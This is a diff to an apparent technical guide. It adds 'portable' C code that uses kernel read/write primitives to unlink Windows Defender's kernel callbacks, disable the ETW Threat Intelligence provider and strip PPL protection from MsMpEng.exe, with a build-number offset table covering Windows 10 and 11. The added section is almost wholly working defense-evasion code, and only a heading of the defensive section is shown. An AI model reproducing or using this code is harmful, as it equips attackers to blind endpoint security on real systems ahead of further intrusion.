@@ -522,6 +522,213 @@ Symbols that are exported and therefore safe to resolve this way:
 
 ---
 
+## Portable Versions
+
+The examples above use hardcoded RVAs tied to one specific build. The versions below replace every `#define RVA_*` with a live export lookup and add a build-number table for the `_EPROCESS` field offsets that shift between Win10 and Win11. No other changes are needed — the logic, reads, and writes are identical.
+
+### Setup Helpers
+
+```c
+/* ------------------------------------------------------------------ */
+/*  Call ResolveSetup() once at startup before any Sym() calls         */
+/* ------------------------------------------------------------------ */
+static char    g_ntPath[MAX_PATH];
+static DWORD64 g_kbase;
+
+void ResolveSetup(void) {
+    GetSystemDirectoryA(g_ntPath, MAX_PATH);
+    strcat_s(g_ntPath, MAX_PATH, "\\ntoskrnl.exe");
+    g_kbase = GetKernelBase();   /* NtQuerySystemInformation, as shown above */
+}
+
+/* Returns the live kernel VA for any exported ntoskrnl symbol */
+DWORD64 Sym(const char *name) {
+    DWORD rva = GetExportRVA(g_ntPath, name);
+    if (!rva) { printf("[-] Export not found: %s\n", name); ExitProcess(1); }
+    return g_kbase + rva;
+}
+```
+
+The `_EPROCESS` field offsets for `ActiveProcessLinks`, `ImageFileName`, and `Protection` are not exported — they are struct offsets that shift with every major Windows release. Detect the build at runtime and pick from a table:
+
+```c
+typedef struct {
+    DWORD buildMin;   /* inclusive */
+    DWORD buildMax;   /* inclusive */
+    DWORD linksOff;   /* ActiveProcessLinks */
+    DWORD nameOff;    /* ImageFileName      */
+    DWORD protOff;    /* Protection byte    */
+} EPROC_OFFSETS;
+
+static const EPROC_OFFSETS g_eprocTable[] = {
+    /* Windows 10  1903 – 22H2  (builds 18362 – 19045) */
+    { 18362, 19045, 0x2F0, 0x450, 0x6FA },
+    /* Windows 11  21H2 – 23H2  (builds 22000 – 22631) */
+    { 22000, 22631, 0x448, 0x5A8, 0x87A },
+};
+
+const EPROC_OFFSETS *GetEprocOffsets(void) {
+    typedef NTSTATUS(NTAPI *RtlGV_t)(PRTL_OSVERSIONINFOW);
+    RtlGV_t RtlGV = (RtlGV_t)GetProcAddress(
+                        GetModuleHandleA("ntdll.dll"), "RtlGetVersion");
+    RTL_OSVERSIONINFOW vi = { sizeof(vi) };
+    RtlGV(&vi);
+    for (int i = 0; i < (int)(sizeof g_eprocTable / sizeof *g_eprocTable); i++)
+        if (vi.dwBuildNumber >= g_eprocTable[i].buildMin &&
+            vi.dwBuildNumber <= g_eprocTable[i].buildMax)
+            return &g_eprocTable[i];
+    printf("[-] Unsupported build %lu — verify offsets with WinDbg and add a row\n",
+           vi.dwBuildNumber);
+    return NULL;
+}
+```
+
+To add a new build: open WinDbg on the target, run `dt nt!_EPROCESS` and read the offsets for `ActiveProcessLinks`, `ImageFileName`, and `Protection`, then insert a new row.
+
+---
+
+### Portable Example 1 — Removing Kernel Callbacks
+
+```c
+void RemoveCallbacksPortable(void) {
+    /* ---- Psp* notify arrays ---- */
+    const DWORD64 arrays[] = {
+        Sym("PspProcessNotifyRoutine"),
+        Sym("PspThreadNotifyRoutine"),
+        Sym("PspImageLoadNotifyRoutine"),
+    };
+    const char *labels[] = { "Process", "Thread", "ImageLoad" };
+
+    for (int a = 0; a < 3; a++) {
+        for (int i = 0; i < 64; i++) {
+            DWORD64 slotAddr = arrays[a] + (DWORD64)i * 8;
+            DWORD64 slot     = kread64(slotAddr);
+            if (!slot) continue;
+
+            DWORD64 block = slot & ~(DWORD64)0xF;
+            DWORD64 fn    = kread64(block + 0x08);
+
+            if (IsFromDriver(fn, "WdFilter")) {
+                kwrite32(slotAddr,     0);
+                kwrite32(slotAddr + 4, 0);
+                printf("[+] Removed %s callback slot [%d]\n", labels[a], i);
+            }
+        }
+    }
+
+    /* ---- ObRegisterCallbacks — Process (index 7) and Thread (index 8) ---- */
+    DWORD64 obTable = Sym("ObTypeIndexTable");
+
+    for (int idx = 7; idx <= 8; idx++) {
+        DWORD64 objType  = kread64(obTable + (DWORD64)idx * 8);
+        DWORD64 listHead = objType + 0x0C8;
+        DWORD64 node     = kread64(listHead);
+
+        while (node && node != listHead) {
+            DWORD64 preOp = kread64(node + 0x028);
+            if (IsFromDriver(preOp, "WdFilter")) {
+                kwrite32(node + 0x014, 0);
+                printf("[+] Disabled ObCallback node 0x%016llX (type idx %d)\n",
+                       node, idx);
+            }
+            node = kread64(node);
+        }
+    }
+
+    /* ---- Registry callbacks (CmRegisterCallbackEx) ---- */
+    DWORD64 cmHead = Sym("CmCallbackListHead");
+    DWORD64 prev   = cmHead;
+    DWORD64 node   = kread64(cmHead);
+
+    while (node && node != cmHead) {
+        DWORD64 next = kread64(node);
+        DWORD64 fn   = kread64(node + 0x028);
+
+        if (IsFromDriver(fn, "WdFilter")) {
+            kwrite64(prev,     next);
+            kwrite64(next + 8, prev);
+            printf("[+] Unlinked Cm callback 0x%016llX\n", node);
+        } else {
+            prev = node;
+        }
+        node = next;
+    }
+}
+```
+
+---
+
+### Portable Example 2 — Disabling ETW Threat Intelligence
+
+```c
+void DisableEtwTiPortable(void) {
+    DWORD64 etwBase    = Sym("EtwpDebuggerData");
+    DWORD64 silo       = kread64(etwBase + 0x18);
+    DWORD64 bucketHead = silo + 0x1D0 + 29 * 0x38;
+    DWORD64 node       = kread64(bucketHead);
+    DWORD64 tiEntry    = 0;
+
+    int guard = 0;
+    while (node && node != bucketHead && guard++ < 64) {
+        if (kread32(node + 0x028) == 0xF4E1897CUL) {
+            tiEntry = node;
+            break;
+        }
+        node = kread64(node);
+    }
+
+    if (!tiEntry) { printf("[-] TI provider not found\n"); return; }
+    printf("[+] TI entry: 0x%016llX\n", tiEntry);
+
+    kwrite32(tiEntry + 0x060, 0);
+    for (int s = 0; s < 8; s++)
+        kwrite32(tiEntry + 0x080 + (DWORD64)s * 0x20, 0);
+
+    printf("[+] ETW-TI disabled\n");
+}
+```
+
+`EtwpDebuggerData` is exported on all versions. The internal offsets (`+0x18`, `+0x1D0`, bucket stride `0x38`, `+0x028`, `+0x060`, `+0x080`) have been stable across Win10 and Win11 releases to date.
+
+---
+
+### Portable Example 3 — Stripping PPL
+
+```c
+void StripPplPortable(void) {
+    const EPROC_OFFSETS *off = GetEprocOffsets();
+    if (!off) return;
+
+    DWORD64 sysEp = kread64(Sym("PsInitialSystemProcess"));
+    DWORD64 ep    = sysEp;
+    int     guard = 0;
+
+    do {
+        char name[16] = {0};
+        for (int i = 0; i < 16; i += 4) {
+            DWORD d = kread32(ep + off->nameOff + i);
+            memcpy(name + i, &d, 4);
+        }
+        name[15] = '\0';
+
+        DWORD64 aligned = (ep + off->protOff) & ~(DWORD64)3;
+        int     shift   = (int)((ep + off->protOff) & 3) * 8;
+        BYTE    prot    = (BYTE)(kread32(aligned) >> shift);
+
+        if (_stricmp(name, "MsMpEng.exe") == 0 && prot) {
+            kwrite8(ep + off->protOff, 0);
+            printf("[+] Stripped PPL from %s (was 0x%02X)\n", name, prot);
+        }
+
+        DWORD64 flink = kread64(ep + off->linksOff);
+        ep = flink - off->linksOff;
+
+    } while (ep != sysEp && ++guard < 512);
+}
+```
+
+---
+
 ## Defense and Detection
 
 | Layer | What it stops |
